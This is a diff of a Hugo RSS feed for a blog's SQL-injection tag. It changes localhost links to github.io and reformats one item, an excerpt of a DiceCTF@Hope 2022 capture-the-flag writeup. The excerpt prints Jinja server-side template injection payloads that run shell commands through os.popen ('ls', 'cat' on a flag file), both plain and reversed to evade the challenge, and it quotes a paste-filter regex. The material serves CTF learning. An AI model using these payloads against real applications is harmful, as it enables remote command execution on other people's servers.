@@ -1,29 +1,19 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>sql injection on j3seer</title>
-    <link>http://localhost:1313/tags/sql-injection/</link>
-    <description>Recent content in sql injection on j3seer</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <title>Sql Injection on j3seer</title>
+    <link>https://j3seer.github.io/tags/sql-injection/</link>
+    <description>Recent content in Sql Injection on j3seer</description>
+    <generator>Hugo</generator>
     <language>en-us</language>
     <lastBuildDate>Thu, 29 Sep 2022 08:59:19 -0400</lastBuildDate>
-    
-	<atom:link href="http://localhost:1313/tags/sql-injection/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <atom:link href="https://j3seer.github.io/tags/sql-injection/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>DiceCTF@Hope 2022 - Writeup</title>
-      <link>http://localhost:1313/posts/dicectfhope_writeup/</link>
+      <link>https://j3seer.github.io/posts/dicectf@hope_writeup/</link>
       <pubDate>Thu, 29 Sep 2022 08:59:19 -0400</pubDate>
-      
-      <guid>http://localhost:1313/posts/dicectfhope_writeup/</guid>
-      <description>Mostly solved the web challenges with Task_Hashed
- Reverser the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed
-regular payload:
-{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}} {{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&#39;).read()}} supplied reversed payload:
-}} )(daer.)&#39;sl&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{ }})(daer.)&#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{  Pastebin the important part of this challenge is :
-if (paste.search(/&amp;lt;.*&amp;gt;/) !== -1) { return res.redirect(&amp;#39;/flash?message=Illegal characters in paste!</description>
+      <guid>https://j3seer.github.io/posts/dicectf@hope_writeup/</guid>
+      <description>&lt;p&gt;Mostly solved the web challenges with Task_Hashed&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;reverser&#34;&gt;Reverser&lt;/h2&gt;&#xA;&lt;p&gt;the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed&lt;/p&gt;&#xA;&lt;p&gt;regular payload:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}&#xA;&#xA;{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&amp;#39;).read()}}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;supplied reversed payload:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;}}  )(daer.)&amp;#39;sl&amp;#39;(nepop.]&amp;#39;so&amp;#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{&#xA;    &#xA;}})(daer.)&amp;#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&amp;#39;(nepop.]&amp;#39;so&amp;#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;h2 id=&#34;pastebin&#34;&gt;Pastebin&lt;/h2&gt;&#xA;&lt;p&gt;the important part of this challenge is :&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (paste&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#ff79c6&#34;&gt;/&amp;lt;.*&amp;gt;/&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; res&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;redirect(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/flash?message=Illegal characters in paste!&amp;#39;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;My solution :&lt;/p&gt;</description>
     </item>
-    
   </channel>
 </rss>
